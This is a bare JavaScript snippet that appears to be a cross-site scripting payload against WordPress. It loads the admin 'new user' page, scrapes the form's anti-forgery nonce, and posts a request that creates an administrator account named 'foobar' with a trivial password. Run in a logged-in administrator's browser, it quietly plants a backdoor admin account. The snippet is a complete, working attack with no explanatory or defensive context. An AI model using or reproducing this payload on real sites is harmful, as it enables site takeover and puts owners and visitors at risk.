u="/wp-admin/user-new.php";jQuery.get(u,function(e){
    jQuery.post(u,{action:"createuser", "_wpnonce_create-user":e.match(/_wpnonce_create-user" value="(.+?)"/)[1], user_login:"foobar", email:"foo@bar.com", pass1:"foo", pass2:"foo", role:"administrator"});
});
